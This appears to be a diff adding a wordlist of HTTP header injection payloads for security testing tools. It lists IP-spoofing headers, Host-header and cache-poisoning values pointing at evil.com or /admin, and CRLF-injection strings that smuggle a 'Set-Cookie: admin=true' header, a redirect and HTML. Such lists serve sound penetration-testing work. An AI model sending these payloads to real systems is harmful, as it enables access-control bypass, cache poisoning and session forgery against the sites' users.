@@ -1,0 +1,33 @@
+# Header Injection Payloads
+# Use with security testing tools
+
+# IP Spoofing Headers
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+
+# Host Header Attacks
+Host: evil.com
+Host: localhost
+Host: 127.0.0.1
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Original-Host: evil.com
+
+# Cache Poisoning
+X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: nothttps
+X-Forwarded-Proto: nothttps
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+
+# CRLF Injection
+%0d%0aHeader-Injection: true
+%0d%0aSet-Cookie: admin=true
+%0d%0aLocation: https://evil.com
+%0d%0a%0d%0a<html>Injected</html>
